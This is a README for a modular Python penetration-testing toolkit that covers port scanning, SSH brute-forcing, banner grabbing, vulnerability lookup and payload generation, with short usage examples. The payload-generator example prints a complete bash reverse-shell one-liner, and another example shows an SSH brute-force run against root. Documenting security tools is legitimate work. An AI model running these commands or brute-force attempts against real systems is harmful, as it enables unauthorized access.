
# **Penetration Testing Toolkit**

## **Overview**
The **Penetration Testing Toolkit** is a Python-based modular toolkit designed to assist in security assessments and penetration testing tasks. It features multiple modules, including port scanning, brute-forcing, banner grabbing, vulnerability scanning, and payload generation. Each module operates independently, and the toolkit provides a simple interface for easy usage.

---

## **Features**
1. **Port Scanner**: Scan a target for open ports.
2. **SSH Brute-Forcer**: Perform a brute-force attack on SSH services.
3. **Banner Grabber**: Retrieve service banners from specific ports.
4. **Vulnerability Scanner**: Check for known vulnerabilities in services.
5. **Payload Generator**: Generate test payloads for reverse shells and buffer overflows.
6. **Report Generation**: Save scan results and findings in a JSON file.

---

## **Installation**

### **Prerequisites**
- Python 3.8 or higher
- Pip (Python package manager)

### **Setup**
1. Clone the repository:
   ```bash
   git clone https://github.com/your-repository/PenTestToolkit.git
   cd PenTestToolkit
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

---

## **Usage**

Run the main script to access all toolkit modules:
```bash
python main.py
```

### **Module Descriptions**
1. **Port Scanner**
   - Scans a target for open ports.
   - Example:
     ```bash
     Enter target IP: 192.168.1.1
     Open ports: [22, 80, 443]
     ```

2. **SSH Brute-Forcer**
   - Attempts to brute-force SSH credentials using a username and password list.
   - Example:
     ```bash
     Enter target IP: 192.168.1.1
     Enter username: root
     Enter path to password file: passwords.txt
     [+] Password found: admin123
     ```

3. **Banner Grabber**
   - Retrieves service banners from a specific port.
   - Example:
     ```bash
     Enter target IP: 192.168.1.1
     Enter port to grab banner: 80
     Banner: Apache/2.4.41
     ```

4. **Vulnerability Scanner**
   - Checks for known vulnerabilities in a specified service and version.
   - Example:
     ```bash
     Enter service: nginx
     Enter version: 1.18.0
     Vulnerabilities: ['CVE-2020-1234']
     ```

5. **Payload Generator**
   - Generates payloads for reverse shells or buffer overflow attacks.
   - Example:
     ```bash
     Enter payload type (reverse_shell/buffer_overflow): reverse_shell
     Generated payload: bash -i >& /dev/tcp/192.168.1.1/8080 0>&1
     ```

---

## **Report Generation**

All scan results are saved in a JSON file located in the `reports/` directory. The default file is `reports/scan_report.json`. The report structure includes:
- Module name
- Timestamp
- Scan results

---

## **Testing**

Each module has an associated test file in the `tests/` directory. Run the tests using `unittest`:
```bash
python -m unittest discover tests
```

---

## **Future Enhancements**
- Add GUI for user-friendly operation.
- Include support for additional protocols like FTP and HTTP.
- Implement a multi-threaded port scanner for faster performance.

---

## **Disclaimer**

This toolkit is for educational purposes only. Use it responsibly and only on systems you own or have explicit permission to test.
